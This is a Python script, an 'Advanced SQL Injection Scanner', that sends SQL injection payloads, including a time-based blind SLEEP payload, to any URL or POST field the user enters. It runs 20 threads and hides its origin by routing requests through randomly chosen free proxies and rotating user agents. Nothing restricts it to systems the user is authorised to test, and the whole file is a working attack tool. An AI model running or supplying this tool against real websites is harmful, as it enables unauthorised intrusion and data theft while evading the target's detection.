import requests
import threading
import random
import time
from queue import Queue

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except:
    import os
    os.system('pip install colorama')
    from colorama import Fore, Style, init
    init(autoreset=True)

payloads = [
    "'", "'--", "\"", "\"--", "' OR '1'='1", "' OR 1=1--",
    "' OR 'x'='x", "' AND 1=1--", "' AND 1=2--", "';--"
]

errors = [
    "sql syntax", "mysql", "warning", "error in your sql",
    "unclosed quotation", "syntax error", "mysqli", "pdo"
]

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X)"
]

proxies_list = []

def fetch_proxies():
    print(f"{Fore.YELLOW}[*] Fetching proxies...")
    try:
        response = requests.get('https://www.proxy-list.download/api/v1/get?type=http', timeout=10)
        if response.status_code == 200:
            proxy_list = response.text.strip().split('\r\n')
            print(f"{Fore.GREEN}[+] {len(proxy_list)} proxies fetched successfully.")
            return proxy_list
        else:
            print(f"{Fore.RED}[!] Failed to fetch proxies.")
            return []
    except Exception as e:
        print(f"{Fore.RED}[!] Error fetching proxies: {e}")
        return []

def get_random_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
    }

def get_random_proxy():
    if proxies_list:
        proxy = random.choice(proxies_list)
        return {"http": proxy, "https": proxy}
    else:
        return None

def request_with_proxy(url, method="GET", data=None, timeout=10):
    for _ in range(3):  # 3 محاولات مع تغيير البروكسي لو فشل
        try:
            proxies = get_random_proxy()
            headers = get_random_headers()
            if method == "GET":
                response = requests.get(url, headers=headers, proxies=proxies, timeout=timeout, allow_redirects=False)
            elif method == "POST":
                response = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=timeout, allow_redirects=False)
            else:
                return None
            return response
        except:
            continue
    return None

def test_payload(url, method, payload, data=None):
    try:
        if method == "GET":
            test_url = url + payload
            response = request_with_proxy(test_url, "GET")
        elif method == "POST":
            data = data.copy() if data else {}
            key = list(data.keys())[0]
            data[key] += payload
            response = request_with_proxy(url, "POST", data)
        else:
            return f"{Fore.RED}[!] Unknown HTTP method."

        if response:
            content = response.text.lower()
            if any(error in content for error in errors):
                return f"{Fore.RED}[!] Vulnerable with payload: {payload}"
            else:
                return f"{Fore.GREEN}[-] Payload OK: {payload}"
        else:
            return f"{Fore.RED}[!] No response for payload: {payload}"
    except Exception as e:
        return f"{Fore.RED}[!] Error with payload {payload}: {e}"

def test_blind_sqli(url, method, data=None):
    payload = "' OR IF(1=1, SLEEP(5), 0)-- "
    durations = []

    for attempt in range(3):
        try:
            if method == "GET":
                test_url = url + payload
                start = time.time()
                request_with_proxy(test_url, "GET")
                end = time.time()
            elif method == "POST":
                data_copy = data.copy() if data else {}
                if data_copy:
                    key = list(data_copy.keys())[0]
                    data_copy[key] += payload
                start = time.time()
                request_with_proxy(url, "POST", data_copy)
                end = time.time()
            else:
                return f"{Fore.RED}[!] Unknown HTTP method."

            duration = end - start
            durations.append(duration)
            time.sleep(1)  # انتظار خفيف بين المحاولات

        except Exception as e:
            return f"{Fore.RED}[!] Error in Blind SQLi attempt: {e}"

    avg_delay = sum(durations) / len(durations)
    if avg_delay > 4.5:
        return f"{Fore.RED}[!] Possible Blind SQL Injection detected! (Average Delay: {avg_delay:.2f}s)"
    else:
        return f"{Fore.GREEN}[-] No Blind SQL Injection detected (Average Delay: {avg_delay:.2f}s)"

def worker(url, method, data, q, results):
    while not q.empty():
        payload = q.get()
        result = test_payload(url, method, payload, data)
        print(result)
        results.append(result)
        q.task_done()

def start_scan(url, method="GET", post_data=None):
    q = Queue()
    results = []

    for payload in payloads:
        q.put(payload)

    threads = []
    for _ in range(20):  # عدد الثريدز
        t = threading.Thread(target=worker, args=(url, method, post_data, q, results))
        t.start()
        threads.append(t)

    q.join()

    print(f"\n{Fore.YELLOW}[*] Testing for Blind SQL Injection...")
    blind_result = test_blind_sqli(url, method, post_data)
    print(blind_result)
    results.append(blind_result)

    with open("log.txt", "a", encoding="utf-8") as file:
        file.write(f"\n=== Testing URL: {url} ({method}) ===\n")
        for res in results:
            file.write(res.replace(Fore.RED, "").replace(Fore.GREEN, "").replace(Fore.YELLOW, "").replace(Style.RESET_ALL, "") + "\n")
        file.write("\n\n")

    vulnerable = any("[!]" in res for res in results)
    if vulnerable:
        print(f"\n{Fore.RED}[!] WARNING: Possible Vulnerabilities detected!")
    else:
        print(f"\n{Fore.GREEN}[-] No vulnerabilities found.")

def main():
    global proxies_list
    print(f"{Fore.CYAN}=== Advanced SQL Injection Scanner v4.0 ==={Style.RESET_ALL}")
    proxies_list = fetch_proxies()

    print(f"Enter full URL (example: https://example.com/item.php?id=)\n")

    while True:
        url = input("URL to test: ").strip()
        if not url:
            print(f"{Fore.RED}Please enter a valid URL.")
            continue
        
        method = input("Choose method (GET/POST): ").strip().upper()
        post_data = None

        if method == "POST":
            raw_data = input("Enter POST data (example: id=1): ").strip()
            if raw_data:
                post_data = dict(x.split('=') for x in raw_data.split('&'))
        
        start_scan(url, method, post_data)

        again = input("\nScan another URL? (y/n): ").lower()
        if again != "y":
            print(f"{Fore.CYAN}Scan finished. Check 'log.txt' for details.")
            break

if __name__ == "__main__":
    main()
